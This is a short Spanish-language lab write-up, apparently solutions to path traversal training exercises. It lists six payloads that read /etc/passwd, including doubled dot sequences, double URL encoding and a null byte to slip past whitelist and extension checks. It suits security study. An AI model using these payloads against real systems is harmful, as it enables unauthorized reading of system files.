
## LAB 1

Clásico path traversal:

```
../../../../../../etc/passwd
```


## LAB 2

Otra forma de hacerlo es tratando de enumerar directamente el directorio raiz:

```
/etc/passwd
```

## LAB 3


Primera forma de bypassear whitelists:

```
....//....//....//....//....//....//....//etc/passwd 
```

## LAB 4


Otra manera de bypassear es url encodeando la / en este caso url encodeamos la / y el % que no suele gustar:

```

..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd 
```


## LAB 5

Cuando tenemos que especificar al inicio un directorio:

```
/var/www/images/../../../../etc/passwd 
```

## LAB 6

Nos especifican una extension, en este caso es jpg, podemos insertarle un byte nulo a ver si le gusta :D

```
../../../../../../../../../etc/passwd%00.jpg
```
